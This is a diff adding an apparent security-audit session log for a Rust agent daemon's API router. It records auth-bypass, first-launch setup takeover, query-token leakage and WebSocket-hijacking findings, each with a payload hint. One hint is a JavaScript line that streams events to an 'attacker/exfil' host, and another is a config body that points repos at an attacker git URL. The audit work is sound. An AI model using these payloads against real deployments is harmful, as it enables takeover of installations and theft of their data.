@@ -493,3 +493,38 @@ notes (pass 11):
 - not raised: render_readme at repro_bundle.rs:187 interpolates finding.path + finding.repo + finding.rule into the README's Markdown without escaping. This is *render-only* today (README.md is plain text inside the tar; the UI does not Markdown-render it). Flag for re-raise if a future change ships the bundle README through Markdown → HTML in the UI or in a CI comment renderer — at that point the same source-of-truth carries directly into the existing pass-3 MARKDOWN_INJECTION + pass-2 XSS sinks.
 - not raised: build_header (repro_bundle.rs:342) refuses names > 100 bytes (USTAR field limit) so a long-finding-id zip-slip via the `{finding_id}/{path}` join is bounded; finding ids are 16 hex chars per pass-10's notes on finding_id_hash. Confirmed safe at HEAD.
 - not raised: verify_sha256 at repro_bundle.rs:417 hashes with BLAKE3 but the function is named `verify_sha256`; semantic mismatch only — the verifier and writer agree on the same hash family, so an attacker substituting an on-disk tar still gets caught. Cosmetic naming bug.
+
+----- session expl-demo @ 2026-05-18 -----
+record_exploration_finding {
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 91,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<api:/api/v1/*>",
+  "rationale": "auth_layer returns Ok unconditionally when state.auth.is_enforced() is false. That branch is taken whenever the daemon was launched with --headless (main.rs:862 sets auth_token = None). The bind address has no loopback-only enforcement (main.rs:830 takes listen_addr from CLI/config verbatim), so `nyx-agent serve --headless --listen 0.0.0.0:3000` exposes every /api/v1 mutation route (repos create/delete, scan trigger, quarantine promote, setup overwrite) to anyone reachable on the network — no token required. Static pass missed this because the bypass is policy (CLI flag) rather than syntax (a hard-coded `return Ok`).",
+  "suggested_payload_hint": "POST /api/v1/repos with attacker-controlled git url, no Authorization header, while daemon runs --headless on a non-loopback bind"
+}
+record_exploration_finding {
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 98,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<api:/api/v1/setup>",
+  "rationale": "is_setup_path(path) && !state.setup.is_complete() bypasses the bearer gate for /api/v1/setup, /setup/status, /setup/doctor on every first-launch boot — including non-headless launches where the operator has not yet finished the wizard. submit_setup writes nyx-agent.toml (state.rs comments confirm `is_complete` flips only once the toml is materialised), so an attacker who reaches the bind addr before the human finishes the wizard can POST their own config and own the install: repo list, secret refs (webhook_secret_ref), trigger sources. The TOCTOU window is the entire first-launch interval. Mitigation that's missing: the open-during-setup carve-out should additionally require an out-of-band one-shot token printed to stderr at startup.",
+  "suggested_payload_hint": "POST /api/v1/setup with body {repos:[{name:'pwn',source:{git:{url:'https://attacker/.git'}}}], triggers:{webhook_secret_ref:'env:ATTACKER_KEY'}} during the first-launch window before the operator submits the wizard"
+}
+record_exploration_finding {
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 128,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<api:*?token=…>",
+  "rationale": "check_query_token accepts the bearer token in the URL query string. Tokens placed in the URL leak through the TraceLayer access logs attached at router.rs:76 (axum's TraceLayer logs the full path including the query), through browser history, and through Referer headers when a /api/v1/runs/:id/summary.html page (server-rendered HTML, see route at line 61) links out. Constant-time compare on the value does not help once the value has been written to a log line. The same token authenticates every endpoint, so a single leak is total compromise. Static pass missed this: there's no obvious sink, the leak is in the framework's logger.",
+  "suggested_payload_hint": "scrape stdout/stderr of the daemon for a `GET /api/v1/...?token=<hex>` line, then replay with that token in an Authorization header"
+}
+record_exploration_finding {
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 1401,
+  "cap": "CORS_MISCONFIG",
+  "endpoint": "<api:GET /api/v1/events (WebSocket upgrade)>",
+  "rationale": "events_ws performs no Origin header check before accepting the WebSocket upgrade. The browser WebSocket constructor does not honour CORS preflight and cannot set Authorization, so the documented client path is the ?token= query (see check_query_token at 128). When an attacker's page sniffs/embeds the token (see token-leak finding above) — or when the daemon runs --headless with no token at all — `new WebSocket('ws://victim-host:3000/api/v1/events?token=<leaked>')` from any origin succeeds and streams every AgentEvent including repo URLs, finding payloads, secret-redacted-but-still-sensitive trace bodies, and replay snapshots. Cross-Site WebSocket Hijacking, classic. Static pass missed it because the route looks fine in isolation — the gap is the missing `is_allowed_origin(req.headers())` guard.",
+  "suggested_payload_hint": "from an attacker-controlled page on a different origin: `new WebSocket('ws://target:3000/api/v1/events?token='+leaked).onmessage=ev=>fetch('https://attacker/exfil',{method:'POST',body:ev.data})`"
+}
+----- end session expl-demo -----
